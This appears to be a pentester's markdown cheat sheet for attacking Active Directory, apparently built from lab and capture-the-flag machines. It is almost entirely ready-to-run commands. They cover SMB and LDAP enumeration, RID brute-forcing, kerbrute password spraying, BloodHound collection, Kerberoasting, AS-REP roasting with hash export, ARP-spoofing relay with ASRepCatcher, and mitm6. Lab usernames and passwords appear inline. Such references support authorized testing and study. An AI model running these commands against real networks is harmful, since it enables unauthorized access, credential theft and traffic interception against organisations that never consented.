
## No Credentials:

- **Nmap** :
```shell
nmap -Pn -sC -sV $t 
nmap -Pn -sC -sV -p- $t #full
```

```shell
sudo nmap -sU -sC -sV $t
```

- **SMB  :** 
```shell
nmap -Pn --script "smb-vuln*" -p139,445 $t #search smb vuln
```

```shell
netexec smb 10.10.65.99 -u "Guest" -p "" --shares

netexec smb 10.10.65.99 -u user.txt -p user.txt --no-bruteforce --continue-on-success

nxc smb $t -u UserNAme -p 'PASSWORDHERE' --rid-brute

proxychains -q nxc smb 10.10.231.69 -u SVC_WEB_STAGING -d REFLECTION -p "" --rid-brute | grep '\\' | cut -d $'\\' -f2 | cut -d ' ' -f1 | tee -a users_rid.txt

```

- Same:
```sh
lookupsid.py sendai.vl/Guest@$t
```

- **LDAP Search:**
```sh
 
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
```

```sh
ldapsearch -x -b "dc=baby2,dc=vl" -H ldap://10.10.119.153 '(ObjectClass=User)' sAMAccountName | grep sAMAccountName | awk '{print $2}'
```

```sh
ldapsearch -x -b "dc=baby2,dc=vl" -H ldap://10.10.119.153 | grep -i -a 'Service Accounts'
```

- **RPCClient :**

```sh
rpcclient -U=" " -N <dc-ip>
```

- **Kerbrute :**
```sh
kerbrute userenum --dc 10.10.11.129 -d search.htb /usr/share/wordlists/seclists/

kerbrute bruteuser --domain baby2.vl --dc $t /usr/share/wordlists/seclists/Passwords/probable-v2-top12000.txt gpoadm -v

#Bruteforce
```

- **Enum4Linux :**
```sh
enum4linux-ng -A iP
```

**Windapsearch :**
```sh
windapsearch -d <Domain Name> --dc-ip <Domain Controller IP> -U | tee windapsearch-enumeration-users
```

## With Credentials:

- **SMB  :**
```sh
smbclient //10.10.196.22/SYSVOL -U library
smbclient \\\\$t\\SYSVOL -U baby2/library
smbclient.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
```

```sh
netexec smb $t2 -u 'rsmith' -p 'IHateEric2' --shares
netexec smb $t -u users.txt -p "" --no-bruteforce --continue-on-success
#Null credential can reveal interesting path
```

```sh
samrdump.py <domain>/<username>:<password>@<target_IP>
```

```sh
smbmap -H IP -d <domainname> -u <username> -p <password>
```

- On windows :
```sh
net view \\dc01 /all
```

- **LDAP Search:**

```sh
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```sh
ldapsearch -H ldap://search.htb -x -D 'username@search.htb' -w "passwords" -b "DC=search,DC=htb" "objectclass=user" sAMAccountName | grep sAMAccountName | awk -F":" '{print $2}'
```

```sh
nxc ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $USER -p $PASSWORD -M maq
nxc ldap $t -k -u users.txt -p 'Cicada123' --kdcHost DC-JPQ225.cicada.vl
```

- **Bloodhound :**
```sh
bloodhound-python -d 'LAB.TRUSTED.VL' -u 'rsmith' -p 'IHateEric2' -ns 10.10.245.166 -dc labdc.LAB.TRUSTED.VL -c all
nxc ldap 10.10.202.37 -u Rhys.Garner -p knh1gJ8Xmeq+uP --bloodhound --collection All -ns 10.10.202.37
```
OR
```sh
./SharpHound.exe --CollectionMethods All
Invoke-BloodHound -CollectionMethod All
```

- **RPCClient :**
```sh
rpcclient -U="username" <dc-ip>
```

**Enum4Linux :**
```sh
enum4linux -u username -p password -A <IP>
enum4linux -u username -p password -U <IP>
```

**GetADUsers.py :**
```sh
GetADUsers.py -all pentesting.local/ippsec:Password12345 -dc-ip 192.168.10.50
```

**Kerberoasting:**

```sh
GetUserSPNs.py breach.vl/Julia.wong:Computer1 -dc-ip $t
GetUserSPNs.py breach.vl/Julia.wong:Computer1 -dc-ip $t -request
```

```sh
findDelegation.py -dc-ip 192.168.1.50 pentesting.local/ippsec:Password12345
```

**Windapsearch :**
```sh
windapsearch -d <Domain Name> --dc-ip <Domain Controller IP> -u "domain\\username" -p "password" -U | tee winapsearch-authenticated-enumerations
```

```sh
windapsearch -d <Domain Name> --dc-ip <Domain Controller IP> -u "domain\\username" -p "password" -G | tee winapsearch-authentication-group-enumerations
```

```sh 
windapsearch -d <Domain Name> --dc-ip <Domain Controller IP> -u "domain\\username" -p "password" --unconstrained-computers | tee unconstrained-computers-enumeration
```

**Ldapdomaindump:**
```sh
ldapdomaindump --user "delegate.vl"\\"N.Thompson" --password "KALEB_2341" --outdir ldapdomaindump "DC1.delegate.vl"
```

## Only Username
- Impacket :
```sh
GetNPUsers.py bruno.vl/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```sh
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```

- Netexec : 
```sh
netexec smb $t -u users.txt -p "" --no-bruteforce --continue-on-success
```

- Discover windows : 
```sh
RunFinger.py -i 10.10.120.0/24
```

- Discover machine
```sh
mitm6 --interface "eth0"
```

- Read Users descriptions :
```sh
nxc smb 192.168.250.170 -u 'joker' -p '<3batman0893' --users
```